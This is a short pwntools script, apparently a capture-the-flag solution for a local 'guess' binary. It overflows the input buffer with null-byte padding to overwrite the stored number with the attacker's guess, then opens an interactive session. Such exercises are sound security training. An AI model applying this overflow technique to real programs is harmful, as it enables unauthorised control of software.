#!/usr/bin/env python3

from pwn import *

r = process('guess');

r.recvuntil('number: ');

myguess = 1234;
r.sendline(str(myguess).encode('ascii').ljust(0xac-0x90, b'\0') + p32(myguess));

r.interactive();
